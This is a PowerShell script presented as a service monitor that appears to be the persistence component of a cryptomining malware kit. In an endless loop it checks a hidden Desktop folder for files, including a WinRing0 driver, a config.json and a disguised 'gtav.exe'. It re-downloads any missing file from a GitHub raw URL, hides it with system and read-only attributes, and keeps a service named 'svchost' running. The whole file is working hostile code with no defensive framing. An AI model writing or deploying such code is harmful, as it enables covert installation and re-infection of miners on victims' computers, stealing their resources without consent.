param(
    [string]$LocalLogFile = "$(Join-Path ([Environment]::GetFolderPath('Temp')) 'monitor_log.txt')"
)

$TargetFolder = "$env:USERPROFILE\Desktop\SystemData"
$ServiceName = "svchost"
$FilesToCheck = @("gtav.exe","gnssm.exe","WinRing0x64.sys","config.json","sha32.dll","uv.dll")
$GitHubBase = "https://raw.githubusercontent.com/HeySinker/bsbs/main/"

# --- Logging ---
function Write-Log {
    param ([string]$Message, [string]$Level="INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $entry = "[$timestamp][$Level] $Message"
    Add-Content -Path $LocalLogFile -Value $entry -ErrorAction SilentlyContinue
}

# --- Ensure service is running ---
function Ensure-ServiceRunning {
    param($ServiceName)
    try {
        $svc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
        if (!$svc) { Write-Log "Service $ServiceName not found!" "ERROR"; return }
        if ($svc.Status -ne 'Running') {
            Start-Service $ServiceName -ErrorAction SilentlyContinue
            Write-Log "Service $ServiceName was stopped. Restarted."
        }
    } catch { Write-Log "Error checking service $ServiceName: $_" "ERROR" }
}

# --- Ensure files exist ---
function Ensure-FilesExist {
    param($Files, $Folder)
    foreach ($file in $Files) {
        $path = Join-Path $Folder $file
        if (!(Test-Path $path)) {
            Write-Log "$file missing, re-downloading..."
            try {
                Invoke-WebRequest -Uri "$GitHubBase$file" -OutFile $path -UseBasicParsing -ErrorAction Stop
                cmd /c "attrib +h +s +r +I `"$path`"" | Out-Null
                Write-Log "$file restored."
            } catch { Write-Log "Failed to restore $file: $_" "ERROR" }
        }
    }
}

# --- Main loop ---
Write-Log "Monitor started for service $ServiceName"
while ($true) {
    Ensure-ServiceRunning -ServiceName $ServiceName
    Ensure-FilesExist -Files $FilesToCheck -Folder $TargetFolder
    Start-Sleep -Seconds 5
}

